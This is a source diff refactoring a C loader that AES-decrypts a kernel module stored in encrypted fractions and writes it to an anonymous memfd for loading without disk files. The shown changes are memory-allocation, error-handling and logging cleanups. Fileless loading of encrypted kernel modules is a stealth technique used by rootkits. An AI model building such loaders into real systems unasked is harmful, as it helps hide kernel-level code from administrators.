@@ -11,63 +11,65 @@
 #include <stdlib.h>
 #include <string.h>
 
-uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len,unsigned char *key) {
+uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len, unsigned char *key) {
 
   uint8_t *module = NULL;
   ssize_t total_size = 0;
   ssize_t module_size = 0;
-  decrypted_t *decr;
+  ssize_t ret;
 
   for (int i = 0; i < fractions_count; i++) {
-    decr = decrypt_fraction(&fractions[i], key);
-    if (decr == NULL) {
-      log_error("Decryption process failed");
+    total_size += fractions[i].data_size;
+  }
+
+  // total_size at this point is the size of all the cipher text which is
+  // bigger than the size of the LKM
+  module = malloc(total_size);
+
+  if (module == NULL) {
+    log_error("Could not allocate memory for LKM");
+    return NULL;
+  }
+
+  for (int i = 0; i < fractions_count; i++) {
+    ret = aes_decrypt(fractions[i].data, fractions[i].data_size, key,
+                         fractions[i].iv, module + module_size);
+    if (ret < 0) {
+      log_error("Could not decrypt fraction at index %d", i);
+      free(module);
       return NULL;
     }
-
-    if (module == NULL) {
-      total_size = decr->text_size;
-      module = malloc(total_size);
-      if (module == NULL) {
-        log_error("Error in memory assigning");
-        decrypted_free(decr);
-        return NULL;
-      }
-    } else {
-      total_size += decr->text_size;
-      uint8_t *tmp = realloc(module, total_size);
-      if (tmp == NULL) {
-        log_error("Memory reallocation failed");
-        free(module);
-        decrypted_free(decr);
-        return NULL;
-      }
-      module = tmp;
-    }
-    memcpy(module + module_size, decr->decrypted_text, decr->text_size);
-    module_size += decr->text_size;
-
-    decrypted_free(decr);
+    module_size += ret;
+    log_debug("Decrypted fraction %d, current module size %ld", i, module_size);
   }
+
+  log_debug("Decrypted LKM. LKM size = %ld bytes, buffer size = %ld bytes, "
+            "wasted = %ld bytes",
+            module_size, total_size, total_size - module_size);
 
   *len = module_size;
   return module;
 }
 
 int load_lkm(const uint8_t *lkm, ssize_t total_size) {
-
-  int fdlkm = syscall(SYS_memfd_create, "lkmmod", 0);
+  int fdlkm;
+  ssize_t written_bytes;
+  
+  fdlkm = syscall(SYS_memfd_create, "lkmmod", 0);
+  
   if (fdlkm < 0) {
     log_error("memfd_create failed");
     return -1;
   }
 
-  ssize_t written_bytes = write(fdlkm, lkm, total_size);
+  written_bytes = write(fdlkm, lkm, total_size);
   if (written_bytes < 0) {
     log_error("Error writing to memfd");
     close(fdlkm);
     return -1;
-  } else if (written_bytes != total_size) {
+  }
+  
+  if (written_bytes != total_size) {
     log_error("Incomplete write to memfd (Expected %zu, wrote %zd)", total_size,
               written_bytes);
     close(fdlkm);
